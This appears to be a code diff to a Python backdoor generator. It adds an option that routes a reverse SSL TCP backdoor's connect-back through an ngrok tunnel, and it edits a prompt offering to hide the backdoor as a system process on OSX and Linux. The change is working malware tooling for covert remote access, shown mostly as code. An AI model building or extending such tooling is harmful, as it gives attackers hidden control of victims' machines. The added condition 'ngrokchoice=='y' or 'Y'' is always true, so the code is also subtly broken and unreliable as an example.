@@ -9,6 +9,7 @@ import platform
 from urllib import response
 import secrets
 import string
+from ripgrok import get_tunnels
 import random
 from pickle import GLOBAL
 bind=0
@@ -219,8 +220,16 @@ def gen_rev_ssl_tcp():
     global host
     global port
     name = 'ocr'
-    host = input('Please enter the ip you wish the backdoor to connect back to: ')
-    port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
+    ngrokchoice=input('Do you want to use ngrok port forwarding? (must have activated this in setup.py) y/n: ')
+    if ngrokchoice=='y' or 'Y':
+        port = input('Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): ')
+        input('Please run this command in another terminal "ngrok tcp '+ port+'" Press enter when you have done this: ')
+        ripgrokhostnport=(get_tunnels())
+        host=ripgrokhostnport.split(':')[0]
+        port=ripgrokhostnport.split(':')[1]
+    else:
+        host = input('Please enter the ip you wish the backdoor to connect back to: ')
+        port = input('Please enter the port number you wish the backdoor to connect to (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
         ina.write(d+' = '+port)
         ina.write("\n")
@@ -420,7 +429,7 @@ def postgen():
             print(logo)
             print('Backdoor saved under "dist" folder')
 def rep_syst():
-    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux only) (y/n): ')
+    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux only and doesnt support ngrok) (y/n): ')
     if hide == 'y':
         global name2
         global reps
